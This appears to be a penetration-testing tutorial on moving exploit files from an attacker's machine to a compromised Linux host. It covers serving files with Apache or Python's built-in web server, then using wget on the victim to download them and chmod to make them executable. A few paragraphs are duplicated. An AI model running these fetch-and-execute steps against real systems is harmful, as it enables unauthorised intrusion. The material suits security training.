
--- Transferring exploits ---

• Linux file transfers
• Python SimpleHTTPServer


When you have to compile an exploit on the attack box you first have to transfer the compiled exploit to the target host before you execute it. If you are lucky enough to have file transfer services or applications, such as FTP or wget, available on the compromised host, you can use these to transfer your compiled exploit. If you’re not so lucky and there are no file transfer tools installed, you have to be more creative and transfer files using Netcat, PowerShell, VBScript or Meterpreter.


-- Linux file transfers --

Given that you have command execution on the target, the easiest way to transfer files from your attack box to a Linux machine is by using wget. Wget is a free software package that is installed by default on most Linux distributions and downloads files using HTTP, HTTPS and FTP. When wget is available on the target host you just need to setup a web or FTP server on the attack box to serve the files.
Let’s assume we have downloaded the exploit that we want to transfer to a compromised host to the desktop of our attack box. To make this file available for download we need to copy it to the Apache web root directory and start a webserver to serve the files in this directory to the target. The default web root directory for the Apache webserver is /var/www/html and this is the location to which we will copy the exploit files from our desktop using the following commands:

cd Desktop
cp exploit /var/www/html

Start the Apache webserver so we can download the exploit file to the compromised host: service apache2 start
Now we can access the Apache web server from the web browser (or wget) using the following URL: http://[IP Webserver]
After serving the last file make sure that you stop the Apache server on the attack box with the following command: service apache2 stop


-- Python SimpleHTTPServer --

Python SimpleHTTPServer is a Python module that allows you to use a single command to create a web server to serve files and web pages. The only requirement for running this module is that you have Python installed.
Python SimpleHTTPServer serves the files in the directory from which it is started. For this reason, it’s important to be careful not to start the webserver in root directories (such as Linux root: '/' or the root users home directory: '/root/') or in directories containing files you don’t want to share.

Python SimpleHTTPServer is a Python module that allows you to use a single command to create a web server to serve files and web pages. The only requirement for running this module is that you have Python installed.
Python SimpleHTTPServer serves the files in the directory from which it is started. For this reason, it’s important to be careful not to start the webserver in root directories (such as Linux root: ‘/’ or the root users home directory: ‘/root/’) or in directories containing files you don’t want to share.
To start the Python SimpleHTTPServer run the following command from the directory that contains the files you want to serve:

sudo python -m SimpleHTTPServer [Optional: port]
sudo python3 -m http.server [Optional: port]

Providing a port number is optional, but if you don’t specify a port number the webserver will bind to port 8000 by default.
Info: It is important to realize that the Python SimpleHTTPServer serves all files and directories from the directory where it’s executed. For example, starting the web server in your OS root directory will serve all files on the system. Therefore, it’s recommended that you only start the web server in a directory that only contains files you want to serve, preferably a dedicated (temporary) ‘sharing directory’.

Now that we’ve got our Python web server running we can use wget on the compromised host to download the file. Use the following command on the remote host to download the file: wget http://172.16.1.1.:8000/exploit.exe

wget http://[IP attack box][:port]/[File name]

!!! Since we’re downloading a file from the attack box to the compromised host we need to enter the IP address of the attack box. !!!

Finally, if we want to execute the downloaded exploit on the remote system we must set the correct permissions to execute the file with the following command: chmod 775 [filename]

After serving the last file make sure that you stop the Python web server on the attack box by simply hitting Ctrl+C in the terminal window.





























